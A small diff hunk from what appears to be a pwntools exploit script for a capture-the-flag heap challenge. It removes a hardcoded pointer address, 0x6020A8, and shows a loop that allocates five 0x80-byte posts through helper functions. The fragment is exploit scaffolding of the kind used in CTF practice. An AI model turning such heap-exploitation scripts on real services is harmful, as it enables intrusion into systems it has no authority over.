@@ -36,7 +36,6 @@ def delPost(idx):
     io.sendlineafter("number: ", str(idx))
 
 if __name__ == "__main__":
-    ptr = 0x6020A8
     for i in xrange(5):
         newPost(str(i) * 0x80)
 
